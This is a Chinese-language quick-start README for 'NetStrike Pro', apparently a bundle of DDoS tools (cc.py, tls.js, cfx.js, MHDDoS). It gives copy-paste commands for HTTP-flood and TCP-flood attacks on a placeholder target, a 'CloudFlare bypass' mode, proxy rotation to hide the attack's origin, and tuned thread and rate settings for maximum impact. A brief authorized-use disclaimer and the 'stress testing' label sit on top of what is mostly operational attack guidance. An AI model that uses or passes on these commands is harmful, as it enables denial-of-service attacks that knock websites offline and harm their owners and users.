# 🚀 START HERE - NetStrike Pro 使用指南

**版本**: v5.0.0 Ultimate Edition  
**状态**: ✅ 完全就绪  
**更新**: 2025-10-27

---

## ⚡ 3 秒快速开始

```bash
cd NetStrike-Pro/legacy
./refresh_proxy.sh
node 新建文件夹/tls.js https://目标.com 120 128 10 proxy_paid.txt
```

**就这么简单！** 🎉

---

## 📋 项目说明

### 你得到了什么？

**✅ 双轨方案**:

1. **legacy/** - 所有原有工具（立即可用）
   - cc.py, tls.js, cfx.js, MHDDoS
   - 代理工具：抓取、筛选、刷新
   - 完整文档

2. **NetStrike-Pro/** - 新专业框架
   - 现代 UI 界面
   - 双语支持
   - 模块化架构

### 选择你的方式

| 方式 | 位置 | 状态 | 适合 |
|------|------|------|------|
| **原有工具** | `legacy/` | ✅ 立即可用 | 压力测试 ⭐ |
| **新框架** | 根目录 | ⏳ 框架阶段 | 体验 UI |

---

## 🎯 立即使用（推荐）

### 步骤 1: 进入工具目录

```bash
cd NetStrike-Pro/legacy
```

### 步骤 2: 刷新代理

```bash
./refresh_proxy.sh
```

### 步骤 3: 选择攻击方式

**CloudFlare 绕过**（最强 ⭐⭐⭐⭐⭐）:
```bash
node 新建文件夹/tls.js https://目标.com 120 128 10 proxy_paid.txt
```

**通用 HTTP 攻击**:
```bash
python3 cc.py -url https://目标.com -f proxy_paid.txt -v http -s 60
```

**MHDDoS 专用**:
```bash
python3 mhddos/start.py CFB 0 https://目标.com 200 proxy_paid.txt 100 180
```

---

## 💡 快速参考

### 常用命令

```bash
# 刷新付费代理
./refresh_proxy.sh

# 筛选免费代理
python3 超高速筛选.py

# 抓取新代理
python3 新建文件夹/scrape.py

# CloudFlare 绕过（推荐）
node 新建文件夹/tls.js https://目标.com 120 128 10 proxy_paid.txt

# 快速 HTTP 攻击
node 新建文件夹/cfx.js https://目标.com proxy_paid.txt 30

# Python CC 攻击
python3 cc.py -url https://目标.com -f proxy_paid.txt -v http -s 60

# MHDDoS Layer 7
python3 mhddos/start.py CFB 0 https://目标.com 200 proxy_paid.txt 100 180

# MHDDoS Layer 4
python3 mhddos/start.py TCP 目标IP:端口 200 180
```

---

## 🎨 体验新框架（可选）

```bash
# 返回主目录
cd ..

# 安装 UI 依赖
pip3 install rich pyfiglet colorama PyYAML

# 测试框架
python3 attack.py --version
python3 attack.py --help

# 查看专业 UI
python3 -c "from ui.intro import show_intro; show_intro('en')"
python3 -c "from ui.intro import show_intro; show_intro('zh')"
```

---

## 📚 完整文档

| 文档 | 内容 |
|------|------|
| **🎯 完整使用指南.md** | 详细教程（必读）⭐ |
| **🌟 项目最终状态.md** | 项目状态说明 |
| **QUICKSTART.md** | 快速开始指南 |
| **README.md** | 框架概览 |

---

## ⚠️ 重要提示

**法律合规**:
- ✅ 仅用于授权测试
- ✅ 必须有书面授权
- ✅ 阅读法律声明

**文档位置**:
- `法律声明.md` - 中文
- `LEGAL_NOTICE.md` - 英文

---

## 🎉 项目特色

### ✅ 零破坏保证

- ✅ 所有原有工具 100% 保留
- ✅ 所有原有功能完整可用
- ✅ 立即开始使用
- ✅ 无需迁移或配置

### 🚀 专业框架

- ✅ 现代化 UI 设计
- ✅ 完整双语支持
- ✅ 模块化架构
- ✅ 易于扩展

---

## 💪 推荐配置

### 最强组合

**代理**: 付费代理（`proxy_paid.txt`）  
**工具**: tls.js（HTTP/2 绕过）  
**配置**: 10 线程 × 128 速率

```bash
cd NetStrike-Pro/legacy
./refresh_proxy.sh
node 新建文件夹/tls.js https://目标.com 180 128 10 proxy_paid.txt
```

### 通用组合

**代理**: 筛选后的免费代理  
**工具**: cc.py（稳定可靠）  
**配置**: 1000 线程 × 60 秒

```bash
cd NetStrike-Pro/legacy
python3 超高速筛选.py
python3 cc.py -url https://目标.com -f filtered_proxies.txt -v 5 -s 60
```

---

## 🔧 故障排除

### Q: 找不到工具？

**A**: 确保在正确目录
```bash
cd NetStrike-Pro/legacy
ls -la
```

### Q: 代理不工作？

**A**: 刷新代理
```bash
./refresh_proxy.sh
```

### Q: Node.js 报错？

**A**: 安装依赖
```bash
cd 新建文件夹
npm install net http2 tls cluster url crypto fs axios cheerio gradient-string
```

### Q: Python 报错？

**A**: 安装依赖
```bash
pip3 install requests pysocks urllib3
```

---

## 📞 需要帮助？

**查看文档**:
1. `🎯 完整使用指南.md` - 详细教程
2. `🌟 项目最终状态.md` - 项目说明
3. `legacy/README.md` - 原项目文档

**验证安装**:
```bash
python3 attack.py --version
# 应显示: NetStrike Pro v5.0.0
```

---

**NetStrike Pro** - 立即开始你的压力测试！  
🎯 **简单** | 💪 **强大** | ✅ **可靠**

© 2025 | Version 5.0.0 Ultimate Edition


